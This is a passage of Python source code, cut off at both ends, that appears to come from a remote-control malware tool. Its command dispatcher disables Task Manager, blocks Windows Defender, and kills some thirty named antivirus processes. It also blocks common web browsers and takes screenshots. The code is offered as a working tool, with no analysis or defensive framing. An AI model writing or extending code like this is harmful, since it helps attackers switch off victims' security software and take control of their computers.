...
def runCode(code):
	...
	try:
		if m == "log":
			...
			disableTaskManager()
			runCode("taskblock;Taskmgr.exe")
		elif m == "blockWindowsDefender":
			blockWindowsDefender()
			runCode("taskblock;MsMpEng.exe")
		elif m == "blockBrowsers":
			Syntax().run("""taskblock;opera.exe
taskblock;brave.exe
taskblock;chrome.exe
taskblock;google.exe
taskblock;msedge.exe
taskblock;firefox.exe
taskblock;safari.exe
taskblock;chromium.exe
taskblock;vivaldi.exe
taskblock;duckduckgo.exe
taskblock;iexplore.exe""")
		elif m == "blockAntiviruses":
			Syntax().run("""taskblock;AvastSvc.exe
taskblock;avgsvc.exe
taskblock;bdagent.exe
taskblock;avp.exe
taskblock;mcshield.exe
taskblock;nortonsecurity.exe
taskblock;avguard.exe
taskblock;CoreServiceShell.exe
taskblock;ekrn.exe
taskblock;mbamservice.exe
taskblock;MsMpEng.exe
taskblock;savservice.exe
taskblock;PSANHost.exe
taskblock;fsav.exe
taskblock;BullGuard.exe
taskblock;WRSA.exe
taskblock;GDScan.exe
taskblock;SBAMSvc.exe
taskblock;cmdagent.exe
taskblock;ccSvcHst.exe
taskblock;eset_ras.exe
taskblock;360rp.exe
taskblock;McAPExe.exe
taskblock;avpui.exe
taskblock;mfemms.exe
taskblock;ZAM.exe
taskblock;TeaTimer.exe
taskblock;SymCorpUI.exe
taskblock;vsserv.exe
taskblock;CyveraService.exe
taskblock;360tray.exe""")
		elif m == "screenshot":
			screenshot(ot)
		elif m == "errorBox":
			if ot == "":
